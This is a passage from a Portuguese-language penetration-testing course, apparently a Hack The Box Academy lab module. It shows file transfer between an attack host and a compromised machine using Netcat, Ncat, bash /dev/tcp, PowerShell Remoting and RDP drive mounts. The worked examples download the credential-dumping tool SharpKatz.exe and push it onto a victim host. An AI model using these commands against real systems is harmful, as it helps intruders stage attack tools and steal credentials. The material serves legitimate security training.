Abordamos vários métodos para transferir arquivos no Windows e Linux. Também abordamos maneiras de atingir o mesmo objetivo usando diferentes linguagens de programação, mas ainda existem muitos outros métodos e aplicativos que podemos usar.

Esta seção abordará métodos alternativos, como a transferência de arquivos usando [Netcat](https://en.wikipedia.org/wiki/Netcat), [Ncat](https://nmap.org/ncat/) e usando as sessões RDP e PowerShell.

## Netcat

[Netcat](https://sectools.org/tool/netcat/) ( frequentemente abreviado para `nc`) é um utilitário de rede de computadores para leitura e gravação em conexões de rede usando TCP ou UDP, o que significa que podemos usá-lo para operações de transferência de arquivos.

O Netcat original era [lançado](http://seclists.org/bugtraq/1995/Oct/0028.html) por Hobbit em 1995, mas não foi mantido apesar de sua popularidade. A flexibilidade e utilidade dessa ferramenta levaram o Projeto Nmap a produzir [Ncat](https://nmap.org/ncat/), uma reimplementação moderna que suporta proxies SSL, IPv6, SOCKS e HTTP, corretagem de conexão e muito mais.

Nesta seção, usaremos o Netcat original e o Ncat.

`**Nota:** **Ncat** é usado no PwnBox do HackTheBox como nc, ncat e netcat.`

## Transferência de arquivos com Netcat e Ncat

O alvo ou a máquina de ataque pode ser usada para iniciar a conexão, o que é útil se um firewall impedir o acesso ao alvo. Vamos criar um exemplo e transferir uma ferramenta para o nosso destino.

Neste exemplo, transferiremos [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) do nosso Pwnbox para a máquina comprometida. Faremos isso usando dois métodos. Vamos trabalhar no primeiro.

Vamos começar Netcat (`nc`) na máquina comprometida, ouvindo com a opção `-l`, selecionando a porta para ouvir com a opção `-p 8000`, e redirecionar o [stdout](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_(stdin)) usando um único maior que `>` seguido pelo nome do arquivo, `SharpKatz.exe`.

#### NetCat - Máquina Comprometida - Ouvindo na Porta 8000

```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

Se a máquina comprometida estiver usando o Ncat, precisaremos especificar `--recv-only` para fechar a conexão assim que a transferência de arquivos estiver concluída.

#### Ncat - Máquina Comprometida - Ouvindo na Porta 8000

```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

No nosso host de ataque, nos conectaremos à máquina comprometida na porta 8000 usando o Netcat e enviaremos o arquivo [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) como entrada para Netcat. A opção `-q 0` dirá à Netcat para fechar a conexão assim que terminar. Dessa forma, saberemos quando a transferência de arquivos foi concluída.

#### Netcat - Anfitrião de ataque - Enviando arquivo para máquina comprometida

```shell-session
casluxd@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
casluxd@htb[/htb]$ # Example using Original Netcat
casluxd@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

Ao utilizar o Ncat em nosso host atacante, podemos optar por `--send-only` ao invés de `-q`. O `--send-only` sinalizador, quando usado nos modos de conexão e escuta, solicita que o Ncat termine quando sua entrada estiver esgotada. Normalmente, o Ncat continuaria em execução até que a conexão de rede fosse fechada, pois o lado remoto pode transmitir dados adicionais. No entanto, com `--send-only`, não há necessidade de antecipar mais informações recebidas.

#### Ncat - Anfitrião de ataque - Enviando arquivo para máquina comprometida

```shell-session
casluxd@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
casluxd@htb[/htb]$ # Example using Ncat
casluxd@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

Em vez de ouvir em nossa máquina comprometida, podemos nos conectar a uma porta em nosso host de ataque para executar a operação de transferência de arquivos. Este método é útil em cenários em que há um firewall bloqueando conexões de entrada. Vamos ouvir na porta 443 do nosso Pwnbox e enviar o arquivo [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) como entrada para Netcat.

#### Anfitrião de ataque - Enviando arquivo como entrada para o Netcat

```shell-session
casluxd@htb[/htb]$ # Example using Original Netcat
casluxd@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Conecte-se à Netcat para receber o arquivo

```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

Vamos fazer o mesmo com Ncat:

```shell-session
casluxd@htb[/htb]$ # Example using Ncat
casluxd@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Conecte-se à máquina comprometida ao Ncat para receber o arquivo

```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

Se não tivermos Netcat ou Ncat em nossa máquina comprometida, o Bash suporta operações de leitura / gravação em um arquivo de pseudo-dispositivo [/dev / TCP/](https://tldp.org/LDP/abs/html/devref1.html).

Escrever para esse arquivo específico faz com que o Bash abra uma conexão TCP com `host:port`, e esse recurso pode ser usado para transferências de arquivos.

#### NetCat - Enviando arquivo como entrada para Netcat

```shell-session
casluxd@htb[/htb]$ # Example using Original Netcat
casluxd@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Ncat - Enviando arquivo como entrada para Netcat

```shell-session
casluxd@htb[/htb]$ # Example using Ncat
casluxd@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Conexão de máquina comprometida ao Netcat Usando / dev / tcp para receber o arquivo

```shell-session
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

`**Nota:** A mesma operação pode ser usada para transferir arquivos do host comprometido para o nosso Pwnbox.`

## Transferência de arquivo da sessão PowerShell

Já falamos sobre fazer transferências de arquivos com o PowerShell, mas pode haver cenários em que HTTP, HTTPS ou SMB não estejam disponíveis. Se for esse o caso, podemos usar [Remoção do PowerShell](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), também conhecido como WinRM, para executar operações de transferência de arquivos.

[Remoção do PowerShell](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) nos permite executar scripts ou comandos em um computador remoto usando as sessões do PowerShell. Os administradores geralmente usam o PowerShell Remoting para gerenciar computadores remotos em uma rede, e também podemos usá-lo para operações de transferência de arquivos. Por padrão, ativar a nova votação do PowerShell cria um ouvinte HTTP e HTTPS. Os ouvintes são executados nas portas padrão TCP / 5985 para HTTP e TCP / 5986 para HTTPS.

Para criar uma sessão de Remoção do PowerShell em um computador remoto, precisaremos de acesso administrativo, ser um membro do `Remote Management Users` agrupe ou tenha permissões explícitas para o PowerShell Remoting na configuração da sessão. Vamos criar um exemplo e transferir um arquivo de `DC01` para `DATABASE01` e vice-versa.

Temos uma sessão como `Administrator` em `DC01`, o usuário tem direitos administrativos sobre `DATABASE01`, e o PowerShell Remoting está ativado. Vamos usar o Test-NetConnection para confirmar que podemos nos conectar ao WinRM.

#### Da porta DC01 - Confirmar WinRM TCP 5985 está aberto no DATABASE01.

```powershell-session
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

```powershell-session
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

Porque esta sessão já tem privilégios `DATABASE01`, não precisamos especificar credenciais. No exemplo abaixo, uma sessão é criada para o computador remoto chamado `DATABASE01` e armazena os resultados na variável nomeada `$Session`.

#### Crie uma sessão de remoção do PowerShell para DATABASE01

```powershell-session
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

Nós podemos usar o cmdlet `Copy-Item`  para copiar um arquivo da nossa máquina local `DC01` para o `DATABASE01` sessão que temos `$Session` ou vice-versa.

#### Copie samplefile.txt do nosso host local para a sessão DATABASE01

```powershell-session
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

#### Copie DATABASE.txt da sessão DATABASE01 para o nosso host local

```powershell-session
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## RDP

O RDP ( Remote Desktop Protocol ) é comumente usado em redes Windows para acesso remoto. Podemos transferir arquivos usando o RDP copiando e colando. Podemos clicar com o botão direito do mouse e copiar um arquivo da máquina Windows à qual nos conectamos e colá-lo na sessão RDP.

Se estivermos conectados ao Linux, podemos usar `xfreerdp` ou `rdesktop`. No momento da redação deste artigo, `xfreerdp` e `rdesktop` permita a cópia de nossa máquina de destino para a sessão RDP, mas pode haver cenários em que isso pode não funcionar conforme o esperado.

Como alternativa para copiar e colar, podemos montar um recurso local no servidor RDP de destino. `rdesktop` ou `xfreerdp` pode ser usado para expor uma pasta local na sessão remota do RDP.

#### Montando uma pasta Linux usando o rdesktop

```shell-session
casluxd@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

#### Montando uma pasta Linux usando xfreerdp

```shell-session
casluxd@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

Para acessar o diretório, podemos nos conectar a `\\tsclient\`, permitindo transferir arquivos de e para a sessão RDP.

![[Pasted image 20230703213255.png]]

Como alternativa, no Windows, o nativo [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) cliente de área de trabalho remota pode ser usado.

![[Pasted image 20230703213301.png]]

Após selecionar a unidade, podemos interagir com ela na sessão remota da seguinte maneira:

`**Nota:** Essa unidade não está acessível a nenhum outro usuário conectado ao computador de destino, mesmo que eles consigam seqüestrar a sessão RDP.`

## Prática torna perfeita

Vale a pena referenciar esta seção ou criar suas próprias anotações sobre essas técnicas e aplicá-las a laboratórios em outros módulos e além.

Você nunca sabe o que está enfrentando até iniciar um laboratório ( ou avaliação do mundo real ). Depois de dominar uma técnica nesta seção ou em outras seções deste módulo, tente outra. Quando você terminar o Caminho do Trabalho do Testador de Penetração, seria ótimo ter tentado a maioria, se não todas, dessas técnicas. Isso ajudará na sua "memória muscular" e fornecerá idéias de como fazer upload / download de arquivos quando você enfrentar um ambiente diferente com certas restrições que facilitam a falha de um método. Na próxima seção, discutiremos a proteção de nossas transferências de arquivos ao lidar com dados confidenciais.